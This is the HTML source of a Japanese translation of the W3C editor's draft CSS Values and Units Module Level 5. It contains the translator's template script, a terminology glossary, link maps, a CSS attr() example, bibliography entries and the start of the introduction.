<!DOCTYPE html><html lang="ja"><head><meta charset="utf-8">
<title>CSS の値と単位 — CSS Values and Units Module Level 4 （日本語訳）</title>

<link rel="stylesheet" href="common.css" type="text/css">
<link rel="stylesheet" href="common-css.css" type="text/css">

<script src="common0.js"></script>
<script src="common1.js" async></script>

<script>

Util.ready = function(){
	var source_data = {
		generate: expand
	};
	Util.switchWordsInit(source_data);
}

function expand(){
	const class_map = this.class_map;
	const tag_map = this.tag_map;
	var link_map = this.link_map;

	return this.html.replace(
		/%[\w\-~一-鿆あ-ん]+|`(.*?)([$@^])(\w*)/g,
		create_html
	);

	function create_html(match, key, indicator, klass){
if(!key) {//%
	return `<var>${match.slice(1)}</var>`;
}

let href = '';
let href1 = '';
{
	const n = key.indexOf('＠');
	if(n > 0) {
		href1 = key.slice(n + 1);
		key = key.slice(0, n);
	}
}
let text = key;

switch(klass){
case 'r':
	text = `[${key}]`;
	href = `#biblio-${key.toLowerCase()}`;
	break;
case 'f':
	const n = text.indexOf('(');
	if(n > 0){
		key = text.slice(0, n);
	} else {
		text = `${key}()`;
	}
	break;
case 't':
	text = `&lt;${key}&gt;`;
	key = key.replace(/\s*\[.+/, '');
	break;
case 'p':
	{
		const i = key.indexOf(':');
		if( i > 0 ){
			key = text.slice(0, i);
			text = `${key}: <code class="value">${text.slice(i+1)}</code>`;
		}
	}
	break;
case 'tp':
	text = `&lt;'<code class="property">${key}</code>'&gt;`;
	href = link_map[`p.${key}`];
	break;
case 'at':
	text = `@${key}`;
	break;
case 'ps':
	text = `:${key}`;
	break;
case 'pe':
	text = `::${key}`;
	break;
case 'l':
	text = `"<code class="literal">${text}</code>"`;
	break;
case 'en':
	return `<span lang="en">${key}</span>`
	break;
case 'xCode':
	return `<a id="_ex-html-${key}">＊</a>`;
	break;
case 'issue':
	href = `~CSSissue/${key}`;
	text = `課題 #${key}`;
	break;
}

let tag = tag_map[klass];
if(tag) {
	let classname = class_map[klass];
	classname = classname ? ` class="${classname}"` : '';
	text = `<${tag}${classname}>${text}</${tag}>`;
}

if(indicator !== '^'){
	href = href1 || link_map[ klass ? `${klass}.${key}` : key ] || href;
	if(!href){
		console.log(match); // check error
		return match;
	}

	switch(indicator){
	case '$':
		text = `<a href="${href}">${text}</a>`;
		break;
	case '@':
		text = `<dfn id="${href.slice(1)}">${text}</dfn>`;
		break;
	}
}

return text;

	}
}
</script>

<script type="text/plain" id="_source_data">


●●options

spec_title:CSS Values and Units Module Level 5
spec_date:2024-08-13
trans_update:2024-08-14
source_checked:240719
page_state_key:CSS
original_url:https://drafts.csswg.org/css-values-5/
spec_status:ED
ref_id_prefix:biblio-
ref_id_lowercase:true
conformance:css
copyright:2024,permissive
trans_1st_pub:2023-04-15

●●class_map
p:property
css:css
at:at-rule
ps:pseudo
pe:pseudo
t:type
tp:type
g:prod
u:unit
f:func
v:value
vC:value
e:element
a:attr

●●tag_map
p:code
t:var
tp:var
g:code
css:code
at:code
ps:code
pe:code
v:code
vC:code
e:code
a:code
f:code
u:code
c:code
i:i
em:em
I:code
cite:cite

●●words_table1
SIZING4:https://drafts.csswg.org/css-sizing-4/
NaN:NaN
autoS:auto

●●words_table

	●構文
糖衣:sugar::~
変種:variant:~
wildcard::::ワイルドカード
遭遇-:encounter:~
丸括弧:parentheses:~
量指定子:multiplier::~
	~comma量指定子:comma-multiplier
繰返n:repetition:繰り返し

	`color-mix^f:variant
	`cross-fade^f:variant
	-:trimming
	文字大小区別かどうか:case-sensitivity
	構文に:syntactically
	値~全体:sole value
	全体を成して:sole
	値~全体を成す:whole value
	現れて:appear
	2 回:twice
	`ident-token$t:ident
	進捗~関数:progress-function
	混合~関数:mix-function
	値~全体を成していない:mixed with other values
	最初の成分は~wildcardをとり得ない:possibility of a wildcard prefix
	書く:write
	書く:written
	書かれ:written
	括られ:wrap

	●CSS
出自の:originating::~
全域:wide:~
math:
計算式:calculation:~
変形:transform::~
確定的:definite::~
	確定的になるか否か:definite-ness
不定:indefinite::~
積層:stacking::~
側:side:~
固定的:fixed:~
auto:
百分率-:percent:~
族:family:::ファミリ
	~font族:font-family

	継承されない:non-inherited
	下位prop:longhand
	名前空間を伴う:namespaced
	内在的に:intrinsically
	-:wrapper

	●処理
代用-:substitute::~
代用:substitution::~
剥いだ:stripした:~

	%要請:req
	%~URL:url
	%計算式:calc
	%N:N
	%百分率~token:-
	引数:arg
	~EACH:in sequence
	~EACH:every instance of
	各:every instance of
	得られ:yield
	-:earliest
	-:looked up
	棄てる:throw out

	●保安
洗浄-:launder:~
直接間接:directly or indirectly:~
dirty:
	~~問題にならない:fine

	●仕様
短絡-:short-circuit:~
差分:diff:~
近過去:recent:~
整理:cleanup:~
違法:illegal:~
稀:rare:~
自明:trivial:~
探求段階:exploratory:~
漸進的:progressive:~
増補:enhancement:~
旧い:old:~
参照r:refer:参照
明白:obvious:~
分析:analysis:~
問い:question:~
答え:answer:~
内来的:inherent:~
人々:people:~
収容-:accommodate:~
昇格-:upgrade:~
選ぶ:chooseする:~
選択肢:choice:~
一律的:all-or-nothing:~

	調べる:look at
	〜過ぎ:overly
	ほとんど，:mostly
	~level 4:`CSS-VALUES-4$r
	`CSS21$r :Level 2
	〜とする:called
	欄:line
	書き直す:rewrite
	~~考えて:think
	確かめる:make sure
	〜にも:partially
	諸々の:miscellaneous
	なれば良さそう:would be nice
	最終的に:ultimately
	ようになる:get 〜
	要求される:CSS UAs must
	どちらでも:simultaneously
	~~妨げる:thwart
	〜し切れ:quite
	実施~上の:practical
	申し分なく:great
	きちんと定義された:well-defined
	対処-:get around
	〜か否か:-ness
	関して:respect
	同じに:identically
	得られるように:lets us get
	互換性:compat
	はい:yes
	いいえ:yes
	うれしい:nice
	結果になる:cause
	にもかかわらず:despite
	に類する:sort of
	~~過度に:Overly
	〜な限り:to the extent
	単純にするため:for simplicity
	抗する:against
	課す:impose
	課さな:impose
	過去に戻れたなら:If we had a time machine
	関わる:matter
	文脈に応じた:contextual

	●未分類
所在指定子:locator::~
改変子:modifier::~
式:expression::~
normal:
	~normal体:normal#1
italic:
	~italic体:~italic:#2
図形:shape:~
	図形:shaped
巡回-:cycle:~
種類:kind:~
数量-:numeric:~
	数量-値（次元を伴い得る数）:numeric or dimensional value
族:family:~
計数:counting:~
維持-:retain:~
開な:open::開いた
開いて:openして::~
装う:masqueradeする:~
上限:limit:~
線形:linear::~

	階が深まるごとに:repeat
	-:present
	深さで:deep
	成す:constitute
	時点:time
	~~説明:illustrate
	そのまま:literal
	そのまま:itself
	箇所:place
	含む:include
	取り出す:pull
	取り出す:draw
	に代えて:in place of
	~~基準:against
	地点:point
	-:finally
	次元を伴う:dimensional
	総数:total number
	他の:the rest of
	それ以外:the rest
	何個目の子になるか:the index of 〜 among the children of
	1 から数える:1-indexed
	~inline化:inline
	少し:slightly
	両~側:either side
	箇所:place
	見える:look
	小さな:minor
	より大きな:larger
	高くなる:taller
	結果は:end up
	同時に:at once
	併用する:mixing
	小さくなったり大きくなる:some small and some large
	各部:parts
	があるとき:sometimes
	表出された値:value expression
	非-:non-
	これまで:previously
	なり得る:potentially
	ごく長くなる:for very long
	ずっと少ない:long 〜 much less than
	超える:larger than
	より低い:smaller
	扱い:treat
	他と異なる:differently
	元々:originally
	~~実際に:indeed

	●進捗／補間
easing:
keyframe:
calc-size:
比率:ratio:~
率:ratio:~
混合-:mix::~
	混合-法:mixing
曲線:curve:~
中間的:intermediate:~
終止-:end:~
現-:current:~
基底s:basis:基底°
安定:stable:~
滑らか:smooth:~
二次:quadratic:~

	~~割合:proportional
	転換-:turn into
	半分:half
	途中:in the middle of
	行く:goin
	0.5 秒:half a second
	全体を通して:thruout
	行く:going
	急変-:jump
	非~百分率~化:de-percentify
	中間点:halfway
	中間点:halfway point
	消え去る:away

	●random 関数
暗号:cryptography::~
暗号-:cryptographic::~
強度:strength:~
高品質な:quality:~
協調:coordination:~
存続期間:lifetime:~
相関:correlation:~
丸ng:rounding::丸め
疑似-:pseudo-:~
段差:step:~
thema::::テーマ
	~thema的:thematic
時間的:temporal:~
一様:uniform:~
分布-:distribute:~
正方形:square:~
別物:distinct:~
数-:number:~
	~randomな数-:random-number
任意的:arbitrary::~

	~group分け:grouping
	~random~cache用の:random-caching
	~cache法:caching
	一様に分布する:drawn from a uniform distribution
	ある範囲内:between a minimum and maximum value
	-:limits
	~~確率:weight
	~~確率:chance
	~random性:randomness
	~~最大な値:the final step to land
	最~大:largest
	約:approximately
	最も近い:nearest
	2 倍の~~確率で:twice as often
	偶然:coincidentally
	一意~性:uniqueness
	整数倍:whole
	整数倍:multiple of
	最小~値との差が~step の整数倍になるよう:form min + (N * step), where N is …
	~randomに:uniformly randomly
	範囲の最小~値からの差が段差の整数倍になる:step between those limits
	何ら繋がりはなく:have no connection
	選び取る:pick

	●random 関数（仕様
素朴:naive:~
生来:natural:~
理論:theory:~
	理論~上は:in theory
各利用:usage:~
根本的:fundamental:~
不用意:accidental:~

	ある程度の:some degree
	視点:perspective
	してもらう:letting
	許容しない:disallow
	とは言え:tho
	大丈夫なはず:should be fine
	別として:aside from
	伝える:tell
	“代用” に類する:leaning
	控えて:upcoming
	見込みが高い:likely
	のか〜のか:versus
	か否か:differently
	するようになる:end up
	かどうかは〜のみに基づく:all that matters is
	〜はずと見込まれる:should be likely
	保つ:keep
	選ばれ:chosen
	きちんと:well-
	疑わしい:suspect
	外れる:falls out of
	アリでない:impossible
	およそ〜ない:it very unlikely
	必要yでない:necessarily
	足る:sufficient
	十分:enough
	“ゆらぎ”:less static and identical
	“華を添える”:just to add a bit of "flair"
	感じられ:feel
	気が散らないほどの:without being distracting
	少なくとも 〜は:definitely
	同じに:identically
	見かけ:look
	見かけ上は異なる:superficially look
	By default:この引数が省略された場合
	影響し得る:issues might have an effect

	●random 関数（未分類
新規:fresh:~
refresh:
	少し:slightly
	両端を成す:boundary
	一緒くた:together
	~~併用:together
	残りの:remaining
	複数の箇所で:multiple places 〜 each location
	何であれ:whatever
	どこか:somewhere
	他の〜は一致する:otherwise-identical
	箇所:place
	現れな／現れる:appear
	含め:including
	前後で／どうしで:across
	`var$f の様にふるまう:var()-like
	上の:preceding
	-:does nothing
	-:inclusive
	-:put
	`CSS-VARIABLES-2$r:Variables


●●original_id_map

●●mdn_urls
●●link_map

at.keyframes:~CSSANIM#at-ruledef-keyframes

	●p
p.interpolate-size:#propdef-interpolate-size
p.animation-name:~CSSANIM#propdef-animation-name
p.animation-timeline:~CSSANIM2#propdef-animation-timeline
p.background-image:~CSSBG#propdef-background-image
p.background-position:~CSSBG#propdef-background-position
p.height:~SIZING#propdef-height
p.width:~SIZING#propdef-width
p.list-style:~CSSLIST#propdef-list-style
p.list-style-type:~CSSLIST#propdef-list-style-type
p.font-family:~CSSFONT#propdef-font-family
p.font-palette:~CSSFONT#propdef-font-palette
p.opacity:~CSSCOLOR#propdef-opacity

	●t （構文
t.declaration-value:~CSSSYN#typedef-declaration-value
t.delim-token:~CSSSYN#typedef-delim-token
t.dimension-token:~CSSSYN#typedef-dimension-token
t.number-token:~CSSSYN#typedef-number-token
t.percentage-token:~CSSSYN#typedef-percentage-token
t.ident-token:~CSSSYN#typedef-ident-token
t.hash-token:~CSSSYN#typedef-hash-token
t.semicolon-token:~CSSSYN#typedef-semicolon-token
t.comma-token:~CSSSYN#typedef-comma-token
t.any-value:~CSSSYN#typedef-any-value

	●t
t.angle:~CSSVAL#angle-value
t.attr-type:#typedef-attr-type
t.attr-name:#typedef-attr-name
t.calc-size-basis:#typedef-calc-size-basis
t.calc-sum:~CSSVAL#typedef-calc-sum
t.cf-image:~CSSIMAGE4#typedef-cf-image
t.color:~CSSCOLOR#typedef-color
t.color:~CSSCOLOR5#typedef-color
t.color-interpolation-method:~CSSCOLOR5#color-interpolation-method
t.container-name:~CSSCOND5#typedef-container-name
t.crossorigin-modifier:#typedef-request-url-modifier-crossorigin-modifier
t.custom-ident:~CSSVAL#identifier-value
t.dashed-ident:~CSSVAL#typedef-dashed-ident
t.dimension-unit:#typedef-dimension-unit
t.dimension:~CSSVAL#typedef-dimension
t.easing-function:~CSSEASING#typedef-easing-function
t.flex:~CSSGRID#typedef-flex
t.frequency:~CSSVAL#frequency-value
t.hex-color:~CSSCOLOR#typedef-hex-color
t.integrity-modifier:#typedef-request-url-modifier-integrity-modifier
t.intrinsic-size-keyword:#typedef-intrinsic-size-keyword
t.length:~CSSVAL#length-value
t.length-percentage:~CSSVAL#typedef-length-percentage
t.media-feature:~MQ5#typedef-media-feature
t.number:~CSSVAL#number-value
t.integer:~CSSVAL#integer-value
t.percentage:~CSSVAL#percentage-value
t.random-caching-options:#typedef-random-caching-options
t.referrerpolicy-modifier:#typedef-request-url-modifier-referrerpolicy-modifier
t.request-url-modifier:#typedef-request-url-modifier
t.size-feature:~CSSCOND5#typedef-size-feature
t.string:~CSSVAL#string-value
t.time:~CSSVAL#time-value
t.url-modifier:~CSSVAL#typedef-url-modifier
t.url:~CSSVAL#url-value
t.keyframe-selector:~CSSANIM#typedef-keyframe-selector
t.transform-list:~TRANSFORM#typedef-transform-list
t.transform-function:~TRANSFORM2#typedef-transform-function
t.whole-value:#whole-value
t.wq-name:~SELECTORS4#typedef-wq-name

	●f
f.attr:#funcdef-attr
f.calc:~CSSVAL#funcdef-calc
f.color-mix:~CSSCOLOR5#funcdef-color-mix
f.counter:~CSSLIST#funcdef-counter
f.cross-fade:~CSSIMAGE4#funcdef-cross-fade
t.image:~CSSIMAGE#typedef-image
f.random-item:#funcdef-random-item
t.random-item():#funcdef-random-item
f.random:#funcdef-random
f.round:~CSSVAL#funcdef-round
f.toggle:#funcdef-toggle
t.toggle():#funcdef-toggle
f.url:~CSSVAL#funcdef-url
f.var:~CSSVAR#funcdef-var
f.progress:#funcdef-progress
t.progress():#typedef-progress-fn
t.progress:#typedef-progress
f.media-progress:#funcdef-media-progress
t.media-progress():#typedef-media-progress
f.container-progress:#funcdef-container-progress
t.container-progress():#typedef-container-progress
f.calc-mix:#funcdef-calc-mix
t.calc-mix():#typedef-calc-mix
f.mix:#funcdef-mix
t.mix():#typedef-mix
f.transform-mix:#funcdef-transform-mix
t.transform-mix():#typedef-transform-mix
f.first-valid:#funcdef-first-valid
t.first-valid():#typedef-first-valid
f.sibling-count:#funcdef-sibling-count
f.sibling-index:#funcdef-sibling-index
f.palette-mix:~CSSFONT#funcdef-palette-mix
f.calc-size:#funcdef-calc-size
t.calc-size():#funcdef-calc-size

	●v

v.angle:#valdef-attr-angle
v.color:#valdef-attr-color
v.flex:#valdef-attr-flex
v.frequency:#valdef-attr-frequency
v.ident:#valdef-attr-ident
v.length:#valdef-attr-length
v.number:#valdef-attr-number
v.percentage:#valdef-attr-percentage
v.string:#valdef-attr-string
v.time:#valdef-attr-time

v.integrity:#funcdef-request-url-modifier-integrity
v.referrerpolicy:#funcdef-request-url-modifier-referrerpolicy
v.crossorigin:#funcdef-request-url-modifier-crossorigin

v.anonymous:#valdef-request-url-modifier-anonymous
v.no-referrer-when-downgrade:#valdef-request-url-modifier-no-referrer-when-downgrade
v.no-referrer:#valdef-request-url-modifier-no-referrer
v.origin-when-cross-origin:#valdef-request-url-modifier-origin-when-cross-origin
v.origin:#valdef-request-url-modifier-origin
v.same-origin:#valdef-request-url-modifier-same-origin
v.strict-origin-when-cross-origin:#valdef-request-url-modifier-strict-origin-when-cross-origin
v.strict-origin:#valdef-request-url-modifier-strict-origin
v.unsafe-url:#valdef-request-url-modifier-unsafe-url
v.use-credentials:#valdef-request-url-modifier-use-credentials

v.numeric-only:#valdef-interpolate-size-numeric-only
v.allow-keywords:#valdef-interpolate-size-allow-keywords

vC.size:#valdef-calc-size-size
vC.any:#valdef-calc-size-any
vC.percentage:#valdef-calc-size-percentage

v.max-content:~SIZING#valdef-width-max-content
v.min-content:~SIZING#valdef-width-min-content
v.~autoS:~SIZING#valdef-width-auto
v.stretch:~SIZING4#valdef-width-stretch

	t.percentage-token:#valdef-progress-percentage-token
	t.number:#valdef-progress-number
	t.easing-function:#valdef-progress-easing-function
	tp.animation-timeline:#valdef-progress-animation-timeline

v.auto:~CSSANIM2#valdef-animation-timeline-auto
v.none:~CSSANIM2#valdef-animation-timeline-none

v.circle:~CSSCOUNTER#circle
	v.circle:~CSS22#value-def-circle
v.disc:~CSSCOUNTER#disc
	v.disc:~CSS22#value-def-disc
v.square:~CSSCOUNTER#square
	v.disc:~CSS22#value-def-square
v.inherit:~CASCADE#valdef-all-inherit
v.red:~CSSCOLOR#valdef-color-red
v.green:~CSSCOLOR#valdef-color-green
v.blue:~CSSCOLOR#valdef-color-blue


	●code 他
ps.nth-child():~SELECTORS4#nth-child-pseudo
at.supports:~CSSCOND#at-ruledef-supports

u.ms:~CSSVAL#ms
u.px:~CSSVAL#px

g.,:~CSSVAL#comb-comma
g.#:~CSSVAL#mult-comma

e.details:~HEinteractive#the-details-element

I.ReferrerPolicy:~REFERRER-POLICY#enumdef-referrerpolicy


	●用語
~commaを包含する生成規則:#comma-containing-productions

~URL値からの要請~改変子を適用する:#apply-request-modifiers-from-url-value

進捗~値:#progress-value
進捗~始端~値:#progress-start-value
進捗~終端~値:#progress-end-value
混合-記法:#mix-notations
混合-始端~値:#mix-start-value
混合-終端~値:#mix-end-value
混合-進捗~値:#mix-progress-value

~random-caching~key:#random-caching-key
~random関数:#css-random-functions
代用する:#substitute-an-attr
代用-:#substitute-an-attr
代用~値:#attr-substitution-value
任意的~代用~関数:#_arbitrary-substitution-function
~random~cache用~key:#random-caching-key
~calc-size基底s:#calc-size-basis
~calc-size計算式:#calc-size-calculation
~calc-size計算式を非~百分率~化する:#de-percentify-a-calc-size-calculation
非~百分率~化-:#de-percentify-a-calc-size-calculation
cS.代用-:#substitute-into-a-calc-size-calculation

	●用語（ level 4
~level 4:#biblio-css-values-4

~URLの要請~改変子~用の手続き:~CSSVAL#url-request-modifier-steps

~CSS全域~keyword:~CSSVAL#css-wide-keywords
~math関数:~CSSVAL#math-function
	型を決定-:~CSSVAL#determine-the-type-of-a-calculation
一貫した型:~CSSVAL#css-consistent-type
一貫した型を有して:~CSSVAL#_css-consistent-type
型を入力と一貫させる:~CSSVAL#css-make-a-type-consistent
計算式:~CSSVAL#calc-calculation
関数-記法:~CSSVAL#functional-notation
次元:~CSSVAL#dimension
小さい表示域~size:~CSSVAL#small-viewport-size
補間-:~CSSVAL#interpolation
補間:~CSSVAL#interpolation
	＠~CSSVAL#simplify-a-calculation-tree

	●用語（CSS

~custom~prop:~CSSVAR#custom-property
無効が保証される値:~CSSVAR#guaranteed-invalid-value
算出d値の時点で無効:~CSSVAR#invalid-at-computed-value-time

出自の要素:~SELECTORS4#originating-element
属性~選択子:~SELECTORS4#attribute-selector
疑似要素:~SELECTORS4#pseudo-element
最終的な出自の要素:~SELECTORS4#ultimate-originating-element
選択子:~SELECTORS4#selector

略式~prop:~CASCADE#shorthand-property
指定d値:~CASCADE#specified-value
算出d値:~CASCADE#computed-value
使用~値:~CASCADE#used-value
継承d値:~CASCADE#inherited-value
継承:~CASCADE#css-inheritance

平坦~化された要素~tree:~CSSSCOPING#flat-tree

成分~値を構文解析する:~CSSSYN#parse-a-component-value
成分~値:~CSSSYN#component-value

要素:~CSSDISP#elements

確定的~size:~SIZING#definite
内在的~size:~SIZING#intrinsic-size
~autoとして挙動する:~SIZING#behave-as-auto

有名~色:~CSSCOLOR#named-color

~animate不可:~WANIM#not-animatable

型:~CSSTOM1#cssnumericvalue-type
型を作成する:~CSSTOM1#cssnumericvalue-create-a-type

登録-済み~custom~prop:~CSSPV1#registered-custom-property

~easing関数:~CSSEASING#easing-function

容器~特能:~CSSCOND5#container-feature

媒体~特能:~MQ5#media-feature
媒体~query:~MQ5#media-query
実~値:~MQ5#real-value

変化-後~style:~TRANSITION#after-change-style

開始-時刻:~WANIM#animation-start-time
終止-時刻:~WANIM#animation-effect-end-time
現-時刻:~WANIM#animation-current-time
~keyframe選択子:~CSSANIM#_keyframe-selector
~keyframe~style規則:~CSSANIM#_keyframe-style-rule

	●用語（外部

~tuple:~INFRA#tuple
前後の~ASCII空白~列を剥いだ:~INFRA#strip-leading-and-trailing-ascii-whitespace

属性:~DOM4#concept-attribute
要素:~DOM4#concept-element
要請:~FETCH#concept-request
rq.~mode:~FETCH#concept-request-mode
rq.~referrer施策:~FETCH#concept-request-referrer-policy
rq.完全性~metadata:~FETCH#concept-request-integrity-metadata
rq.資格証~mode:~FETCH#concept-request-credentials-mode

●●images

●●html_code_list

■attr-types-1
<在庫>
  <木材 長さ="12"/>
  <木材 長さ="5"/>
  <金属 長さ="19"/>
  <木材 長さ="4"/>
</在庫>
％
在庫::before {
  display: block;
  content: "ある縮尺による，在庫の各素材の長さ：";
}
在庫 > * {
  display: block;
  width: attr(length em, 0px);
  height: 1em;
  border: solid thin;
  margin: 0.5em;
}
木材 {
  background: orange url(wood.png);
}
金属 {
  background: silver url(metal.png);
}

<stock>
  <wood length="12"/>
  <wood length="5"/>
  <metal length="19"/>
  <wood length="4"/>
</stock>

stock::before {
  display: block;
  content: "To scale, the lengths of materials in stock are:";
}
stock > * {
  display: block;
  width: attr(length em, 0px);
  height: 1em;
  border: solid thin;
  margin: 0.5em;
}
wood {
  background: orange url(wood.png);
}
metal {
  background: silver url(metal.png);
}


●●ref_normative

[CSS-ANIMATIONS-1]
    David Baron; et al. ＜CSS Animations Level 1＞. URL: https://drafts.csswg.org/css-animations/
[CSS-ANIMATIONS-2]
    David Baron; Brian Birtles. ＜CSS Animations Level 2＞. URL: https://drafts.csswg.org/css-animations-2/
[CSS-BACKGROUNDS-3]
    Elika Etemad; Brad Kemper. ＜CSS Backgrounds and Borders Module Level 3＞. URL: https://drafts.csswg.org/css-backgrounds/
[CSS-CASCADE-5]
    Elika Etemad; Miriam Suzanne; Tab Atkins Jr.. ＜CSS Cascading and Inheritance Level 5＞. URL: https://drafts.csswg.org/css-cascade-5/
[CSS-COLOR-4]
    Chris Lilley; Tab Atkins Jr.; Lea Verou. ＜CSS Color Module Level 4＞. URL: https://drafts.csswg.org/css-color-4/
[CSS-COLOR-5]
    Chris Lilley; et al. ＜CSS Color Module Level 5＞. URL: https://drafts.csswg.org/css-color-5/
[CSS-CONDITIONAL-3]
    David Baron; Elika Etemad; Chris Lilley. ＜CSS Conditional Rules Module Level 3＞. URL: https://drafts.csswg.org/css-conditional-3/
[CSS-CONDITIONAL-5]
    Chris Lilley; David Baron; Elika Etemad. ＜CSS Conditional Rules Module Level 5＞. URL: https://drafts.csswg.org/css-conditional-5/
[CSS-CONTAIN-3]
    Tab Atkins Jr.; Florian Rivoal; Miriam Suzanne. ＜CSS Containment Module Level 3＞. URL: https://drafts.csswg.org/css-contain-3/
[CSS-DISPLAY-3]
    Elika Etemad; Tab Atkins Jr.. ＜CSS Display Module Level 3＞. URL: https://drafts.csswg.org/css-display/
[CSS-EASING-1]
    Brian Birtles; Dean Jackson; Matt Rakow. ＜CSS Easing Functions Level 1＞. URL: https://drafts.csswg.org/css-easing/
[CSS-EASING-2]
    ＜CSS Easing Functions Level 2＞. Editor's Draft. URL: https://drafts.csswg.org/css-easing-2/
[CSS-FONTS-4]
    Chris Lilley. ＜CSS Fonts Module Level 4＞. URL: https://drafts.csswg.org/css-fonts-4/
[CSS-GRID-2]
    Tab Atkins Jr.; Elika Etemad; Rossen Atanassov. ＜CSS Grid Layout Module Level 2＞. URL: https://drafts.csswg.org/css-grid-2/
[CSS-IMAGES-3]
    Tab Atkins Jr.; Elika Etemad; Lea Verou. ＜CSS Images Module Level 3＞. URL: https://drafts.csswg.org/css-images-3/
[CSS-IMAGES-4]
    Tab Atkins Jr.; Elika Etemad; Lea Verou. ＜CSS Images Module Level 4＞. URL: https://drafts.csswg.org/css-images-4/
[CSS-SIZING-3]
    Tab Atkins Jr.; Elika Etemad. ＜CSS Box Sizing Module Level 3＞. URL: https://drafts.csswg.org/css-sizing-3/
[CSS-SIZING-4]
    Tab Atkins Jr.; Elika Etemad; Jen Simmons. ＜CSS Box Sizing Module Level 4＞. URL: https://drafts.csswg.org/css-sizing-4/
[CSS-SYNTAX-3]
    Tab Atkins Jr.; Simon Sapin. ＜CSS Syntax Module Level 3＞. URL: https://drafts.csswg.org/css-syntax/
[CSS-TRANSFORMS-1]
    Simon Fraser; et al. ＜CSS Transforms Module Level 1＞. URL: https://drafts.csswg.org/css-transforms/
[CSS-TRANSFORMS-2]
    Tab Atkins Jr.; et al. ＜CSS Transforms Module Level 2＞. URL: https://drafts.csswg.org/css-transforms-2/
[CSS-TRANSITIONS-1]
    David Baron; et al. ＜CSS Transitions＞. URL: https://drafts.csswg.org/css-transitions/
[CSS-TYPED-OM-1]
    Tab Atkins Jr.; François Remy. ＜CSS Typed OM Level 1＞. URL: https://drafts.css-houdini.org/css-typed-om-1/
[CSS-VALUES-4]
    Tab Atkins Jr.; Elika Etemad. ＜CSS Values and Units Module Level 4＞. URL: https://drafts.csswg.org/css-values-4/
[CSS-VARIABLES-2]
    ＜CSS Custom Properties for Cascading Variables Module Level 2＞. Editor's Draft. URL: https://drafts.csswg.org/css-variables-2/
[CSS21]
    Bert Bos; et al. ＜Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification＞. URL: https://drafts.csswg.org/css2/
[DOM]
    Anne van Kesteren. ＜DOM Standard＞. Living Standard. URL: https://dom.spec.whatwg.org/
[ECMASCRIPT]
    ＜ECMAScript Language Specification＞. URL: https://tc39.es/ecma262/multipage/
[FETCH]
    Anne van Kesteren. ＜Fetch Standard＞. Living Standard. URL: https://fetch.spec.whatwg.org/
[INFRA]
    Anne van Kesteren; Domenic Denicola. ＜Infra Standard＞. Living Standard. URL: https://infra.spec.whatwg.org/
[MEDIAQUERIES-4]
    Florian Rivoal; Tab Atkins Jr.. ＜Media Queries Level 4＞. URL: https://drafts.csswg.org/mediaqueries-4/
[MEDIAQUERIES-5]
    Dean Jackson; et al. ＜Media Queries Level 5＞. URL: https://drafts.csswg.org/mediaqueries-5/
[REFERRER-POLICY]
    Jochen Eisinger; Emily Stark. ＜Referrer Policy＞. URL: https://w3c.github.io/webappsec-referrer-policy/
[RFC2119]
    S. Bradner. ＜Key words for use in RFCs to Indicate Requirement Levels＞. March 1997. Best Current Practice. URL: https://datatracker.ietf.org/doc/html/rfc2119
[SELECTORS-4]
    Elika Etemad; Tab Atkins Jr.. ＜Selectors Level 4＞. URL: https://drafts.csswg.org/selectors/
[WEB-ANIMATIONS-1]
    Brian Birtles; et al. ＜Web Animations＞. URL: https://drafts.csswg.org/web-animations-1/
[WEB-ANIMATIONS-2]
    Brian Birtles; Robert Flack. ＜Web Animations Level 2＞. URL: https://drafts.csswg.org/web-animations-2/

●●ref_informative

[CSS-LISTS-3]
    Elika Etemad; Tab Atkins Jr.. ＜CSS Lists and Counters Module Level 3＞. URL: https://drafts.csswg.org/css-lists-3/
[CSS-PROPERTIES-VALUES-API-1]
    Tab Atkins Jr.; Alan Stearns; Greg Whitworth. ＜CSS Properties and Values API Level 1＞. URL: https://drafts.css-houdini.org/css-properties-values-api-1/
[CSS-SCOPING-1]
    Tab Atkins Jr.; Elika Etemad. ＜CSS Scoping Module Level 1＞. URL: https://drafts.csswg.org/css-scoping/
[CSS-VARIABLES-1]
    Tab Atkins Jr.. ＜CSS Custom Properties for Cascading Variables Module Level 1＞. URL: https://drafts.csswg.org/css-variables/
[CSS22]
    Bert Bos. ＜Cascading Style Sheets Level 2 Revision 2 (CSS 2.2) Specification＞. URL: https://drafts.csswg.org/css2/
[HTML]
    Anne van Kesteren; et al. ＜HTML Standard＞. Living Standard. URL: https://html.spec.whatwg.org/multipage/
[SELECTORS-3]
    Tantek Çelik; et al. ＜Selectors Level 3＞. URL: https://drafts.csswg.org/selectors-3/


●●trans_metadata
<p>
~THIS_PAGEは、~W3Cにより編集者草案として公開された
<a href="~SPEC_URL">CSS Values and Units Module Level 5</a>
を日本語に翻訳したものです。
~PUB
</p>

●●spec_metadata

最新公表バージョン
	https://www.w3.org/TR/css-values-5/
公表履歴
	https://www.w3.org/standards/history/css-values-5/
フィードバック
	<a href="https://github.com/w3c/csswg-drafts/labels/css-values-5">CSSWG Issues Repository</a>

編集
	<a href="http://xanthir.com/contact/">Tab Atkins</a> (Google)
	<a href="http://fantasai.inkedblade.net/contact">Elika J. Etemad / fantasai</a> (Apple)
	<a href="http://miriamsuzanne.com/contact">Miriam E. Suzanne</a> (Invited Expert)

Suggest an Edit for this Spec
	<a href="https://github.com/w3c/csswg-drafts/blob/main/css-values-5/Overview.bs">GitHub Editor</a>
commit 履歴
	https://github.com/w3c/csswg-drafts/commits/main/css-values-5

</script>
<body>

<header>
	<hgroup>
<h1>CSS の値と単位 — CSS Values and Units Module Level 5</h1>
	</hgroup>
</header>

<div id="MAIN" hidden>
	<section id="abstract">
◎要約

<p>
この~CSS~moduleは、
~CSS~propに受容される共通な値と単位，および
~CSS~prop定義の中でそれらの値と単位を述べるために利用される構文について述べる。
◎
This CSS module describes the common values and units that CSS properties accept and the syntax used for describing them in CSS property definitions.
</p>

~CSSisaLANG

	</section>
	<section id="sotd">
◎位置付け

<p>
これは、編集者草案の公な複製です…
【以下、この節の内容は，~SOTD-CSSに移譲。】
</p>

	</section>

<main id="MAIN0">

	<section id="intro">
<h2 title="Introduction">1. 序論</h2>

<p class="issue">
<strong>
これは、
`~level 4$ からの差分~仕様である。
</strong>
◎
This is a diff spec against CSS Values and Units Level 4.
</p>

		<section id="placement">
<h3 title="Module Interactions">1.1. ~module間の相互作用</h3>

<p>
`~level 4$ は、
`CSS21$r の
`§ 1.4.2.1＠~TR/CSS2/about.html#value-defs$,
`§ 4.3＠~TR/CSS2/syndata.html#values$,
